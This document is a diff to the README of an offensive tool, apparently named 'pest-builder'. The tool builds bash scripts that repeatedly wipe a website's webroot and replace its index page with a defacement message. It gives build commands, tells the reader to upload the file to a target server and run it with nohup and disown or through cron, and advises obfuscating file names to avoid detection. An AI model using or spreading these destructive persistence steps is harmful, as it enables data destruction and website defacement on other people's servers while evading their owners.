@@ -6,9 +6,9 @@ This is a fire and forget way to keep a webmaster confused.
 
 Using the build tool, you can generate three different types of bash files that will perform differently.
 
-- Wiper : Will consistently wipe the webroot and replace the index.php/index.html with a custom message
+- Loop wiper : Will consistently wipe the webroot and replace the index.php/index.html with a custom message. Runs in an infinite loop.
 
-- Cron Wiper : Same as the wiper, but will be used as a cron job
+- Cron wiper : Same as the **loop**, but runs only once as it is intended to be added as a cron job.
 
 # How it works
 
@@ -23,19 +23,19 @@ To build the final product you need the following
 - Sleep time in seconds (This will be ignored for cron wiper). This serves as a delay between each run.
 
 
-To build a wiper, run:
+To build a loop wiper, run:
 
 ```bash
-bash pest-builder wiper /home/user/public_html "Hacked" 60
+bash pest-builder loop /home/user/public_html "Hacked" 60
 ```
 
-A file named ".wiper" will be created.
+A file named ".loop_wiper" will be created.
 
 
 To build a cron wiper, run:
 
 ```bash
-bash pest-builder cronwiper /home/user/public_html "Hacked" 60
+bash pest-builder cron /home/user/public_html "Hacked" 60
 ```
 
 A file named ".cron_wiper" will be created.
@@ -46,18 +46,16 @@ It is important you obfuscate these files by changing the file names, making the
 Also note that the cron wiper is discouraged as it raises attention and is quick to spot.
 
 ## Using the generated files
-To run the wiper
+To run the loop_wiper, upload the file to the target server and run the following command on the target server.
 
 ```bash
-nohup bash .wiper & disown
+nohup bash .loop_wiper & disown
 ```
 
-To run the .cron_wiper, add it the the list of cron jobs.
+To run the .cron_wiper, **add it the the list of cron jobs**. Using the cpanel or **crontab** command.
 
 
-If you find this page cryptic, or you have no idea what's going on, maybe you should not be here at all. Go build a cute website or an app.
+If you find this page confusing, or you have no idea what's going on, maybe you should not be here at all. Go build a cute website or an app.
 
 
-
-
-Stay Dangerous :)
+Stay Dangerous.
